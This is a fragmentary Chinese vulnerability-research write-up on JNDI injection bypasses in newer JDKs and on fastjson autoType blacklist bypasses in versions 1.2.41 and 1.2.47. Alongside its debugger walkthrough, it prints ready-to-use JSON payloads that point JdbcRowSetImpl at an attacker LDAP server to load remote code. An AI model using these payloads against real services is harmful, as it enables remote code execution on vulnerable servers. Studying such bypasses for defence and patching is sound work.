    0x03 JNDI 注入利用 Bypass 高版本 JDK 限制

    前言：

    NDI 注入利用非常广泛但是在高版本 JDK 中由于默认 codebase 为 true 从而导致客户端默认不会请求远程Server上的恶意 Class。本文主要学习 KINGX 师傅所提出的两种 Bypass 的方法

    KINGX 师傅文章链接：https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA

    RMI：JDK 8u113、JDK 7u122、JDK 6u132 起 codebase 默认为 true

    LDAP：JDK 11.0.1、JDK 8u191、JDK 7u201、JDK 6u211 起 codebase 默认为 true

    3.1 Bypass1：返回序列化Payload，触发本地Gadget

    原理：当我们开启一个恶意的 Server 并控制返回的数据，由于返回的数据是序列化的，然后利用本地的Gadget，比如CommonsCollections链，然后可以结合Fastjson等漏洞入口点和JdbcRowSetImpl进行组合利用。

    JNDI也可以与LDAP目录服务进行交互，Java对象在LDAP目录中也有多种存储形式：

    • Java序列化
    • JNDI Reference
    • Marshalled对象
    • Remote Location (已弃用)
      LDAP可以为存储的Java对象指定多种属性：
    • javaCodeBase
    • objectClass
    • javaFactory
    • javaSerializedData

    上面的 恶意 LDAP Server 中其实最关键的是以下这个函数

    可以看到该函数中将序列化payload放到了 javaSerializedData 变量中

    因为恶意Server只是返回序列化payload，所以在调试分析中并不是我关注的重点，我所关注的是客户端是如何将返回的数据进行反序列化并进行触发，所以我在 lookup 处打了断点

    前期我们只需要重点关注 lookup 就行了，不断的进行跟进

    最后会来到 com.sun.jndi.ldap.LdapCtx#c_lookup，我们这里注意到 JAVA_ATTRIBUTES 变量

    JAVA_ATTRIBUTES 为一个 String 数组，这里的 JAVA_ATTRIBUTES[2] 对应的就是 javaClassName ，也就是说如果 javaClassName 不为 null 那么就会调用 Obj.decodeObject 来处理 var4

    static final String[] JAVA_ATTRIBUTES = new String[]{"objectClass", "javaSerializedData", "javaClassName", "javaFactory", "javaCodeBase", "javaReferenceAddress", "javaClassNames", "javaRemoteLocation"};

    这里的 var4 就是恶意 Server 所返回的值

        String jsonstr = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\", \"dataSourceName\":\"ldap://192.168.52.132:1389/Exploit\", \"autoCommit\":false}";
        Object jsonObject = JSON.parseObject(jsonstr);
        System.out.println(jsonObject);
    }
}

    6.2 源码分析，主要分析为啥要前后加L和;

    因为现在@Type是LLcom.sun.rowset.JdbcRowSetImpl;，自然不会被黑名单进行过滤拦截，但成功通过黑白名单过滤后，程序接下来会通过TypeUtils.loadClass方法对类进行加载

    跟进TypeUtils.loadClass方法

    方框里就是本次最重要的代码了，我们要分析下，为什么fastjson要编写这两段代码？

    这两段代码是对Lcom.sun.rowset.JdbcRowSetImpl;进行过滤，第一段去除[，第二段去除首位的L和最后位的;。

    要明白为什么要编写这两处if语句，需要认识一下JNI字段描述符

    6.3 JNI字段描述符

    ”[LAutoTypeTest.ForTest;”这种类型的字符串其实是一种对函数返回值和参数的编码，名为JNI字段描述符（JavaNative Interface FieldDescriptors)。

    AutoTypeTest.ForTest类的Class对象名为”AutoTypeTest.ForTest”；为了区分，AutoTypeTest.ForTest类的数组类型的Class对象名则为”[LAutoTypeTest.ForTest;”这样的形式。

    其中首个字符”[”用以表示数组的层数，而第二个字符则代表数组的类型。

    这里举例说明一下JNI字段描述符的格式：

    1、double[][]对应的类对象名为”[[D”

    2、int[]对应的类对象名则为”[I”

    3、AutoTypeTest.ForTest[]对应的类对象名则为”[LAutoTypeTest.ForTest;”

    前两者比较好理解，而第三个”[LAutoTypeTest.ForTest;”，可见第二个字符是”L”,且最后一个字符是”;”。这种形式叫类描述符，”L”与”;”之间的字符串表示着该类对象的所属类（AutoTypeTest.ForTest）

    所以，我们就知道了为什么fastjson要写两处if逻辑语句了。

    实际上是用来解析传入的数组类型的Class对象字符串，作用就是用来解析传入的数组类型的Class对象字符串。

    6.4 漏洞复现

    根据上面的分析，我们知道”Lcom.sun.rowset.JdbcRowSetImpl;”经过第二处if逻辑，会转为”com.sun.rowset.JdbcRowSetImpl”,也就是我们的恶意类。

    Poc执行成功，计算器也可以顺利的弹出

    8.2 源码分析

    1.2.47漏洞利用分析还是挺难的，看不懂的建议跟着调试然后多看一遍。

    先说下漏洞原理：通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。

    第一种情况：1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用

    为什么要先分析这种情况呢，因为这个思路很好很喵，看完这种情况，其实第二种情况就特别简单了。

    分析第一个json字符串{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}

    我们先跟进ParserConfig#checkAutoType，还是老样子前面代码还是使用黑白名单进行过滤，这里不重复进行分析，直接看949行。

    跟进TypeUtils#getClassFromMapping

    • mappings集合

    可以看到mappings，这里我们还不知道mappings是什么，在哪里被设置了。

    我们可以crtl+alt+N，然后搜mappings，可以看到fastjson-1.2.47，就是它了，点进去看看

    mappings中存储的数据是由位于TypeUtils.java的方法添加的。

    Mapping是用来存储一些基础的Class，以便于在反序列化处理这些基础类时提高效率，这是本次绕过的关键。

    显然，我们构造的typeName(@type指定的”java.lang.Class”)并不在Mappings的键中，因此getClassFromMapping方法返回null，程序继续向下执行进入下一个if分支。

    ParserConfig#checkAutoType

    跟进deserializers#findClass

    从上图代码可见，程序会遍历buckets，取出其中元素的key属性值的名称并与传入的”java.lang.Class”进行比较，如果二者相同，则将这个Class对象返回。

    • buckets集合

    通过FastJson作者关于buckets集合的注释猜测，buckets是一个用于并发的IdentityHashMap。

    那我们继续回到调试。deserializers#findClass会返回clazz(“class java.lang.Class”)

    ParserConfig#checkAutoType

    最终checkAutoType方法会在963行返回clazz(“class java.lang.Class”)。

    重点：Mapping集合则是用来存储基础的Class，如果@type字段传入的字符串如果对应了基础Class，程序则直接找到其类对象并将其类对象返回，从而跳过了checkAutoType后续的部分校验过程。而buckets集合则是用于并发操作，所以也就解释了，为什么会用到Mapping、buckets集合，主要是起到性能优化。

    checkAutoType方法会在963行返回clazz后，我们回到DefaultJSONParser中。

    384行调用deserializer.deserialze方法，deserializer是MiscCodec类的对象，所以这里调用的是MiscCodec.deserialze方法

    MiscCodec#deserialze

    237行，将”com.sun.rowset.JdbcRowSetImpl”赋值给objVal变量

    248行，将”objVal”的类型转为String类型。

    335行，调用TypeUtils.loadClass方法，跟进。

    1242行在该代码段中，程序通过contextClassLoader.loadClass(className);方法从字符串类型className变量(“com.sun.rowset.JdbcRowSetImpl”)获取到com.sun.rowset.JdbcRowSetImpl类对象，并赋值给clazz变量。此时的className、clazz变量形式如下图。

    在当cache为true时，将className、clazz键值对加入mappings集合(cache默认为true)。

    Mappings集合中确实已经加入了我们的恶意类com.sun.rowset.JdbcRowSetImpl，见下图。

    到这里我们第一个json字符串就分析完了，总结下第一个json字符串主要是为了把com.sun.rowset.JdbcRowSetImpl加入到mapping集合中。

    分析第二个json字符串{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.52.132:1389/Exploit","autoCommit":true}

    这个json字符串，应该很熟悉，它就是我们1.2.24的pyload。

    老规矩，还是进入ParserConfig#checkAutoType方法，931行进行黑名单过滤，按道理，我们@type是”com.sun.rowset.JdbcRowSetImpl","dataSourceName”，而黑名单禁止了com.sun，肯定会被黑名单过滤然后抛出异常的。

    但是，上图942行，第一个判断条件Arrays.binarySearch(denyHashCodes, hash) >= 0是满足的，因为我们输入的@type包含了黑名单的内容；关键点来了，第二个判断条件TypeUtils.getClassFromMapping(typeName) == null，因为我们第一个json字符串已经把”com.sun.rowset.JdbcRowSetImpl”加入到mapping中了，所以这里的值不等于null。也就是说该条件并不满足，导致能够成功绕过黑名单校验并没有抛出异常，成功触发漏洞。

    DefaultJSONParser.ParserObject

    ParserConfig.checkAutotype绕过黑白名单，返回clazz

    DefaultJSONParser.ParserObject

    MiscCodec.deserialize

    TypeUtils.loadClass

    mapping.put 添加恶意类到mapping集合中

    Fastjson1.2.47#ParserConfig#checkAutotype

    简单总结

    1. fastjson漏洞版本很多，首先是从最开始的1.2.22-1.2.24因@type引发的反序列化漏洞。
    2. 到 了1.2.25版本意识到危害后把@type改为默认关闭，还添加了黑白名单进行校验开启autotype传入的@type。
    3. 在1.2.48版本之前中途出的发布的各种版本都是由于之前的漏洞修复很草率而出的，期间还有了1.2.25-1.2.47通杀payload。
      1. 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用
      2. 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用直到1.2.48后才完全修复之前的过问题。
